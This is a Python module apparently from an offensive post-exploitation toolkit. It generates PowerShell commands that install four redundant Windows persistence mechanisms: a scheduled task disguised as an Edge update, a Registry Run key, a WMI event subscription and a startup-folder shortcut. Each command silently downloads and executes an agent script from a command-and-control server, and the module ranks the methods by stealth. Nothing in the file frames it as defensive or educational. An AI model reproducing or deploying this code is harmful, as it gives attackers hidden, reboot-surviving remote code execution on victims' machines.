#!/usr/bin/env python3
"""
Persistence Deployment Module
Multiple redundant persistence mechanisms
"""

from typing import List, Dict
from dataclasses import dataclass


@dataclass
class PersistenceMethod:
    """Represents a single persistence technique"""
    name: str
    description: str
    command: str
    stealth_level: str  # 'low', 'medium', 'high'
    reliability: str    # 'low', 'medium', 'high'


class PersistenceManager:
    """
    Manages deployment of multiple persistence mechanisms
    Ensures redundant access across system reboots and interruptions
    """
    
    def __init__(self, c2_server: str):
        """
        Initialize persistence manager
        
        Args:
            c2_server: Command and Control server address
        """
        self.c2_server = c2_server
        self.methods = self._initialize_methods()
    
    def _initialize_methods(self) -> List[PersistenceMethod]:
        """Initialize available persistence methods"""
        return [
            PersistenceMethod(
                name="Scheduled Task Persistence",
                description="User-level scheduled task - survives reboot",
                stealth_level="medium",
                reliability="high",
                command=f"""
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\\'http://{self.c2_server}/agent.ps1\\')"'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskMachineUA' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
"""
            ),
            
            PersistenceMethod(
                name="Registry Run Key",
                description="Registry autorun - immediate execution on login",
                stealth_level="low",
                reliability="high",
                command=f"""
Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SecurityUpdate' -Value 'powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\\'http://{self.c2_server}/agent.ps1\\')"'
"""
            ),
            
            PersistenceMethod(
                name="WMI Event Subscription",
                description="WMI-based persistence - very stealthy",
                stealth_level="high",
                reliability="medium",
                command=f"""
$FilterName = 'SystemStartFilter'
$ConsumerName = 'SystemStartConsumer'
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name=$FilterName; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name=$ConsumerName; CommandLineTemplate='powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\\'http://{self.c2_server}/agent.ps1\\')"'}}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter; Consumer=$Consumer}}
"""
            ),
            
            PersistenceMethod(
                name="Startup Folder",
                description="LNK file in startup folder - simple and effective",
                stealth_level="low",
                reliability="high",
                command=f"""
$StartupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
$LnkPath = "$StartupPath\\SecurityUpdate.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($LnkPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://{self.c2_server}/agent.ps1')`""
$Shortcut.Save()
"""
            )
        ]
    
    def get_recommended_methods(self, count: int = 3) -> List[PersistenceMethod]:
        """
        Get recommended persistence methods
        Balances stealth, reliability, and redundancy
        
        Args:
            count: Number of methods to return
            
        Returns:
            List of recommended persistence methods
        """
        # Prioritize high reliability methods with varied stealth levels
        recommended = [
            m for m in self.methods 
            if m.reliability == 'high'
        ][:count]
        
        if len(recommended) < count:
            # Add medium reliability methods if needed
            remaining = count - len(recommended)
            recommended.extend([
                m for m in self.methods 
                if m.reliability == 'medium'
            ][:remaining])
        
        return recommended
    
    def get_method_by_name(self, name: str) -> PersistenceMethod:
        """Get specific persistence method by name"""
        for method in self.methods:
            if method.name.lower() == name.lower():
                return method
        raise ValueError(f"Persistence method not found: {name}")
    
    def get_all_methods(self) -> List[PersistenceMethod]:
        """Get all available persistence methods"""
        return self.methods
    
    def generate_deployment_commands(self, methods: List[PersistenceMethod] = None) -> List[str]:
        """
        Generate PowerShell commands for persistence deployment
        
        Args:
            methods: Specific methods to deploy (default: recommended 3)
            
        Returns:
            List of PowerShell command strings
        """
        if methods is None:
            methods = self.get_recommended_methods()
        
        return [method.command for method in methods]
    
    def get_deployment_summary(self, methods: List[PersistenceMethod] = None) -> Dict:
        """
        Get summary of persistence deployment
        
        Args:
            methods: Methods being deployed
            
        Returns:
            Dictionary with deployment details
        """
        if methods is None:
            methods = self.get_recommended_methods()
        
        return {
            'total_methods': len(methods),
            'methods': [
                {
                    'name': m.name,
                    'description': m.description,
                    'stealth': m.stealth_level,
                    'reliability': m.reliability
                }
                for m in methods
            ],
            'stealth_profile': {
                'low': len([m for m in methods if m.stealth_level == 'low']),
                'medium': len([m for m in methods if m.stealth_level == 'medium']),
                'high': len([m for m in methods if m.stealth_level == 'high'])
            }
        }
